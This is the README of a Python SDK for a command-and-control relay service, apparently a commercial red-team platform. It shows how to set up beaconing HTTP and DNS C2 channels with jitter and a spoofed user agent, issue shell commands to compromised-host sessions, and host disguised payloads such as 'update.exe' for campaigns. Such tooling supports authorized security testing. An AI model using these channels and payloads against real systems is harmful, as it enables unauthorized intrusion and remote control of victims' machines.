# Mirqab Cloud Relay SDK

Python SDK for connecting Master Server to Mirqab Cloud Relay infrastructure.

## Installation

```bash
pip install mirqab-relay-sdk
```

## Quick Start

### 1. Activate License and Get Credentials

First, activate your license through the Command Center API:

```python
import requests

# Activate license with Command Center
response = requests.post(
    "https://command.mirqab.io/api/v1/activate",
    json={
        "license_key": "MIRQAB-PRO-XXXXXXXX-XXXXXXXXXXXX",
        "master_server_id": "ms-001",
        "master_server_version": "1.0.0",
        "organization_name": "Your Organization",
        "admin_email": "admin@yourorg.com",
    }
)

# Save credentials
credentials = response.json()["credentials"]
with open("relay_credentials.json", "w") as f:
    json.dump(credentials, f)
```

### 2. Connect to Cloud Relay

```python
from mirqab_relay import CloudRelayClient, RelayCredentials

# Load credentials
credentials = RelayCredentials.from_file("relay_credentials.json")

# Initialize client
client = CloudRelayClient(credentials)

# Check relay status
status = client.get_status()
print(f"Relay status: {status.status}")
print(f"HTTP C2: {status.c2_http_status}")
print(f"DNS C2: {status.c2_dns_status}")
```

## Features

### C2 Channel Management

```python
from mirqab_relay import C2ChannelType

# List existing channels
channels = client.list_channels()
for channel in channels:
    print(f"{channel.name}: {channel.endpoint}")

# Create new HTTP C2 channel
channel = client.create_channel(
    name="Primary HTTP",
    channel_type=C2ChannelType.HTTPS,
    config={
        "beacon_interval": 60,
        "jitter": 20,
        "user_agent": "Mozilla/5.0...",
    }
)
print(f"Channel endpoint: {channel.endpoint}")

# Pause/Resume channel
client.pause_channel(channel.channel_id)
client.resume_channel(channel.channel_id)
```

### Session Management

```python
# List active sessions
sessions = client.list_sessions(status="active")
for session in sessions:
    print(f"{session.hostname} ({session.external_ip})")
    print(f"  User: {session.username}")
    print(f"  OS: {session.os_info}")
    print(f"  Last seen: {session.last_seen}")

# Get session details
session = client.get_session("session-id-here")

# Send command to session
command = client.send_command(
    session_id=session.session_id,
    command_type="shell",
    payload={"command": "whoami"}
)

# Get command result
result = client.get_command_result(
    session_id=session.session_id,
    command_id=command.command_id
)
print(f"Result: {result.result}")

# Terminate session
client.terminate_session(session.session_id)
```

### Payload Management

```python
# Upload payload
payload = client.upload_payload(
    file_path="/path/to/payload.exe",
    filename="update.exe",
    expires_hours=24,
    max_downloads=100,
    metadata={"campaign": "test-01"}
)
print(f"Download URL: {payload.download_url}")

# List payloads
payloads = client.list_payloads()
for p in payloads:
    print(f"{p.filename}: {p.download_count} downloads")

# Delete payload
client.delete_payload(payload.payload_id)
```

### Heartbeat

```python
# Manual heartbeat
response = client.send_heartbeat(
    active_operations=5,
    system_health={
        "cpu_percent": 45.0,
        "memory_percent": 60.0,
    }
)

# Automatic heartbeat with callback
def on_status_update(status):
    if not status.is_healthy:
        print("WARNING: Relay unhealthy!")

client.start_heartbeat(interval=60, callback=on_status_update)

# ... do work ...

client.stop_heartbeat()
```

## Error Handling

```python
from mirqab_relay.exceptions import (
    AuthenticationError,
    ConnectionError,
    TenantSuspendedError,
    TenantExpiredError,
    QuotaExceededError,
)

try:
    status = client.get_status()
except AuthenticationError:
    print("Invalid credentials - re-activate license")
except TenantSuspendedError:
    print("Tenant suspended - contact support")
except TenantExpiredError:
    print("Subscription expired - renew license")
except QuotaExceededError:
    print("Quota exceeded - upgrade tier or cleanup")
except ConnectionError as e:
    print(f"Connection failed: {e}")
```

## Context Manager

```python
# Use as context manager for automatic cleanup
with CloudRelayClient(credentials) as client:
    client.start_heartbeat()
    # ... do work ...
# Heartbeat stopped and session closed automatically
```

## License

MIT License - See LICENSE file for details.
